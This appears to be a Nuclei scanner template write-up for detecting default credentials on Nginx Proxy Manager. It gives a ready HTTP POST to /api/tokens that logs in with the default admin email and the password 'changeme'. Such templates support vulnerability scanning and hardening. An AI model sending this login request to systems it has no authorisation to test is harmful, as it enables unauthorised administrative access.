# Nuclei Template: Nginx Proxy Manager - Default Login
**Template ID:** nginx-proxy-manager-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`nginx-proxy-manager-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Default Nginx Proxy Manager credentials was discovered.

## Steps to reproduce / Exploit Payload
```http
POST /api/tokens HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"identity": "admin@example.com","secret": "changeme"}
```

